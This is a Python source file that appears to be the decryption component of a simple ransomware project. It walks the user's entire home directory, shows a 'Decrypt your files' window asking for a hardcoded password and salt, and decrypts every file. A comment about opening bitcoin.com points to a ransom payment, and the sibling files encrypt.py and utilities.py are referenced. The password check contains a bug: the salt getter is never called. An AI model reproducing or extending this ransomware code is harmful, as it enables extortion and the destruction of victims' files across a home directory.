import os
from utilities import decrypt, generate_key
# import everything from tkinter module
from tkinter import *

excluded_dirs = {"env", ".git"}
excluded_files = {
    "decrypt.py",
    "test.py",
    "encrypt.py",
    "utilities.py",
    "key.txt",
    "README.md",
    ".gitignore",
}

files = []

home_dir = os.path.expanduser("~")

password = bytes()
salt = bytes()

for root, dirs, filenames in os.walk(home_dir):
    dirs[:] = [d for d in dirs if d not in excluded_dirs]

    for file in filenames:
        if file in excluded_files:
            continue
        files.append(os.path.join(root, file))

# create a tkinter root window to display GUI
root = Tk()

# root window title and dimension
root.title("Decrypt your files")
root.geometry('500x300')

password_var=StringVar()
salt_var=StringVar()

#Create the message to display to the user
messageTxt = Message(root, text="Enter the password and salt to decrypt your files")
messageTxt.config(font="50")

password_label = Label(root, text='Password')
password_entry = Entry(root, textvariable = password_var)

salt_label = Label(root, text='Salt')
salt_entry = Entry(root, textvariable=salt_var)

# Open the browser to bitcoin.com
def onClick():
    if(password_var.get() != "nohope1234567890" and salt_var.get != "sixteen890123456"):
        messageTxt.config(text="Invalid password and salt")
    else:
        global password
        password = bytes(password_var.get(), "utf-8")
        global salt
        salt = bytes(salt_var.get(), "utf-8")
        root.destroy()

# Create a Button for the user to click on
button = Button(root, text="Decrypt", command=onClick, height=5, width=10)

messageTxt.pack(side='top')
password_label.pack()
password_entry.pack()
salt_label.pack()
salt_entry.pack()
button.pack(side='bottom')
root.mainloop()

print(password)
print(salt)
secret_key = generate_key(password, salt)

print("\n", "generated Secret Key:", secret_key)

for file in files:
    try:
        with open(file, "rb") as _file:
            contents = _file.read()
            dec_content = decrypt(secret_key, contents)

        with open(file, "wb") as _file:
            _file.write(dec_content)
    except:
        print("File could not be decrypted")
        print(file)

print("decryption complete")
